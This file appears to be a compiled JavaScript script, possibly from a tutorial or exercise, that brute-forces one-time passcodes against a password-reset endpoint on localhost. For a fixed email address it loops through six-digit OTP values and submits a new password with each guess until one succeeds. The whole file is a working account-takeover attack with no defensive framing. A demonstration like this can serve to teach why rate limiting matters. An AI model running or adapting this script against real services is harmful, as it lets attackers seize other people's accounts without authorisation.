"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function attackNow({ email, otp, newPassword }) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email,
            otp,
            newPassword
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
            console.log("done for " + otp);
        }
        catch (e) {
            // @ts-ignore
            console.log(e.response.data);
            console.log("failed for " + otp);
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 463500; i < 1000000; i++) {
            yield attackNow({
                email: "sahil@gmail.com",
                otp: (i).toString(),
                newPassword: "Newpassword"
            });
        }
    });
}
main();
